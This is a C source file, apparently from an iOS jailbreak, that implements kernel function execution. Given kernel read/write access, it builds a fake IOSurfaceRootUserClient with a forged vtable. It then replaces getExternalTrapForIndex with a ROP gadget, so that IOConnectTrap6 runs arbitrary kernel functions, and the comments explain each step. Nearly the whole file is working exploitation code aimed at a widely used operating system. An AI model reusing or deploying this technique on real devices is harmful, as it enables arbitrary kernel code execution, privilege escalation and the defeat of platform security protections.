#include <kexecute.h>
#include <kernel.h>
#include <common.h>

#if !__arm64e__
static mach_port_t prepare_user_client() {
    kern_return_t err;
    mach_port_t user_client;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    
    if (service == IO_OBJECT_NULL) {
        LOG("Unable to find service");
        return MACH_PORT_NULL;
    }
    
    err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS) {
        LOG("Unable to get user client connection");
        return MACH_PORT_NULL;
    }
    
    return user_client;
}
#endif

pthread_mutex_t kexecute_lock;
#if !__arm64e__
static mach_port_t user_client;
static uint64_t IOSurfaceRootUserClient_port;
static uint64_t IOSurfaceRootUserClient_addr;
static uint64_t fake_vtable;
static uint64_t fake_client;
static const int fake_kalloc_size = 0x1000;
#endif

bool init_kexecute() {
#if __arm64e__
    if (!parameters_init()) return false;
    kernel_task_port = task_for_pid_zero;
    if (!MACH_PORT_VALID(kernel_task_port)) return false;
    current_task = kread64(find_port(mach_task_self()) + offsetof_ipc_port_ip_kobject);
    if (!KERN_POINTER_VALID(current_task)) return false;
    kernel_task = kread64(GETOFFSET(kernel_task));
    if (!KERN_POINTER_VALID(kernel_task)) return false;
    if (!kernel_call_init()) return false;
#else
    user_client = prepare_user_client();
    if (!MACH_PORT_VALID(user_client)) return false;
    
    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
    IOSurfaceRootUserClient_port = find_port(user_client); // UserClients are just mach_ports, so we find its address
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_port)) return false;
    
    IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + offsetof_ipc_port_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_addr)) return false;
    
    uint64_t IOSurfaceRootUserClient_vtab = kread64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_vtab)) return false;
    
    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
    
    // Create the vtable in the kernel memory, then copy the existing vtable into there
    fake_vtable = kalloc(fake_kalloc_size);
    if (!KERN_POINTER_VALID(fake_vtable)) return false;
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(fake_vtable+i*8, kread64(IOSurfaceRootUserClient_vtab+i*8));
    }
    
    // Create the fake user client
    fake_client = kalloc(fake_kalloc_size);
    if (!KERN_POINTER_VALID(fake_client)) return false;
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(fake_client+i*8, kread64(IOSurfaceRootUserClient_addr+i*8));
    }
    
    // Write our fake vtable into the fake user client
    kwrite64(fake_client, fake_vtable);
    
    // Replace the user client with ours
    kwrite64(IOSurfaceRootUserClient_port + offsetof_ipc_port_ip_kobject, fake_client);
    
    // Now the userclient port we have will look into our fake user client rather than the old one
    
    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
    kwrite64(fake_vtable+8*0xB7, GETOFFSET(add_x0_x0_0x40_ret));
#endif
    pthread_mutex_init(&kexecute_lock, NULL);
    return true;
}

void term_kexecute() {
#if __arm64e__
    kernel_call_deinit();
#else
    kwrite64(IOSurfaceRootUserClient_port + offsetof_ipc_port_ip_kobject, IOSurfaceRootUserClient_addr);
    kfree(fake_vtable, fake_kalloc_size);
    kfree(fake_client, fake_kalloc_size);
#endif
    pthread_mutex_destroy(&kexecute_lock);
}

uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t returnval = 0;
    pthread_mutex_lock(&kexecute_lock);
#if __arm64e__
    returnval = kernel_call_7(addr, 7, x0, x1, x2, x3, x4, x5, x6);
#else
    
    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually wokreads is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.
    
    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)
    
    uint64_t offx20 = kread64(fake_client+0x40);
    uint64_t offx28 = kread64(fake_client+0x48);
    kwrite64(fake_client+0x40, x0);
    kwrite64(fake_client+0x48, addr);
    returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
    kwrite64(fake_client+0x40, offx20);
    kwrite64(fake_client+0x48, offx28);
#endif
    
    pthread_mutex_unlock(&kexecute_lock);
    return returnval;
}
